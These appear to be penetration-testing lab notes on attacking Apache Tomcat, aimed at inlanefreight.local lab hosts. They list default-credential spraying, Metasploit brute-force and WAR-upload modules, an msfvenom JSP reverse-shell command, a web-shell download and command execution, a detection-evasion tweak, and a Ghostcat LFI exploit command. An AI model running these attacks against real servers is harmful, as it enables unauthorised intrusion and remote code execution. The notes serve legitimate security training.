### Footprinting + Enumeration
```bash
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Apache Tomcat
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 
```

```bash
gobuster dir -u http://adot8.com -w ~/opt/wordlists/directory-list-2.3-medium.txt
 -x txt,html -t 100
```

Tomcat webapps folder structure
```bash
webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp
    |   └── admin.jsp
    └── web.xml
    └── lib
    |    └── jdbc_drivers.jar
    └── classes
        └── AdminServlet.class   
```
The **most important f**ile among these is `WEB-INF/web.xml`, which is known as the deployment descriptor. This file stores information about the routes used by the application and the classes handling these routes. All compiled classes used by the application should be stored in the `WEB-INF/classes` folder. These classes might contain important business logic as well as sensitive information. Any vulnerability in these files can lead to total compromise of the website. The `lib` folder stores the libraries needed by that particular application

The `web.xml `configuration above defines a new servlet named AdminServlet that is mapped to the class `com.inlanefreight.api.AdminServlet.` Java uses the dot notation to create package names, meaning the path on disk for the class defined above would be:

    classes/com/inlanefreight/api/AdminServlet.class

Next, a new servlet mapping is created to map requests to /admin with AdminServlet. This configuration will send any request received for /admin to the AdminServlet.class class for processing. The web.xml descriptor holds a lot of sensitive information and is an important file to check when leveraging a Local File Inclusion (LFI) vulnerability.

The `tomcat-users.xml` file is used to allow or disallow access to the /manager and host-manager admin pages.

```bash
!-- user manager can access only manager section -->
<role rolename="manager-gui" />
<user username="tomcat" password="tomcat" roles="manager-gui" />

<!-- user admin can access manager and admin section both -->
<role rolename="admin-gui" />
<user username="admin" password="admin" roles="manager-gui,admin-gui" />
```

```shell
├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
```
### Exploitation
#### Password spraying
```
tomcat:tomcat
admin:admin
```
#### Login Bruteforcing
```
use auxiliary/scanner/http/tomcat_mgr_login
set stop_on_success true
```
This is another tool that can perform the bruteforcing [Tomcat-Manager-Bruteforce](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce)
```bash
python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```
#### RCE via WAR File Upload
```bash
use exploit/multi/http/tomcat_mgr_upload
```
**Alternatively**
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war

wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp 
```
`Browse` to select the .war file and then click on `Deploy`
View that `/backup` is a n application path
```bash
curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
```
###### Obfuscation
Change 
```java
FileOutputStream(f);stream.write(m);o="Uploaded:
```
To
```java
FileOutputStream(f);stream.write(m);o="uPlOaDeD:
```
###### Cleanup
To clean up after ourselves, we can go back to the main Tomcat Manager page and click the `Undeploy` button next to the `backups` application after, of course, noting down the file and upload location for our report, which in our example is `/opt/tomcat/apache-tomcat-10.0.10/webapps`. If we do an `ls` on that directory from our web shell, we'll see the uploaded `backup.war` file and the `backup` directory containing the `cmd.jsp` script and `META-INF` created after the application deploys. Clicking on `Undeploy` will typically remove the uploaded WAR archive and the directory associated with the application.

#### Known Vulnerabilities
##### Ghostcat
Tomcat was found to be vulnerable to an unauthenticated LFI in a semi-recent discovery named [Ghostcat](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938)

Nmap output
```bash
PORT     STATE SERVICE VERSION
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 9.0.30
```

```bash
use auxiliary/admin/http/tomcat_ghostcat
```

The PoC code for the vulnerability can be found [here](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi)
```shell
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml
```